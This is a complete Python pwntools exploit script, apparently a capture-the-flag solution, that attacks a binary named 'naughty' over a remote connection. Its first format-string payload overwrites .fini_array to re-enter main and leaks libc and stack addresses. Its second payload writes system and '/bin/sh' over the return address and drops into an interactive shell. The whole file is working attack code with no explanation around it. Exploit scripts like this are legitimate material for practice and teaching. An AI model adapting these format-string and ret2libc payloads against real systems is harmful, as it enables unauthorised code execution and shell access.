#!/usr/bin/python3 

from pwn import *

#p = process('./naughty')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
p = remote('p1.tjctf.org', 8004)
libc = ELF('libc-database/db/libc6-i386_2.27-3ubuntu1_amd64.so')

binary = ELF('./naughty')
fini_array = binary.get_section_by_name('.fini_array').header.sh_addr

### 1st pass
p.recvuntil('What is your name?')

payload  = b''
payload += b'%' + str((binary.symbols['main']) & 0xFFFF).rjust(6,'0').encode() + b'x'
payload += b'%14$hn  '
payload += b'%2$p'
payload += b' %19$p  '
payload += p32(fini_array)

p.sendline(payload)
p.recvuntil('You are on the NAUGHTY LIST ')
_ = p.recvline().strip()[-27:]

_IO_2_1_stdin_ = int(_[:10],16)
print('_IO_2_1_stdin_',hex(_IO_2_1_stdin_))
baselibc = _IO_2_1_stdin_ - libc.symbols['_IO_2_1_stdin_']
print('baselibc',hex(baselibc))

offset = 0x98
return_address = int(_[11:21],16) - offset
print('return_address',hex(return_address))

### 2nd pass
p.recvuntil('What is your name?')

binsh = baselibc + next(libc.search(b"/bin/sh"))
system = baselibc + libc.symbols['system']

words = {}
words[system & 0xFFFF] = return_address
words[system >> 16]    = return_address + 2
words[binsh & 0xFFFF]  = return_address + 8
words[binsh >> 16]     = return_address + 10

n=0; q=7+16; payload = b''
for i in sorted(words):
	payload += b'%' + str(i-n).rjust(6,'0').encode() + b'x'
	payload += b'%' + str(q).rjust(4,'0').encode() + b'$hn'
	n += (i-n)
	q += 1

for i in sorted(words):
	payload += p32(words[i])

p.sendline(payload)
p.recvline()
p.interactive()
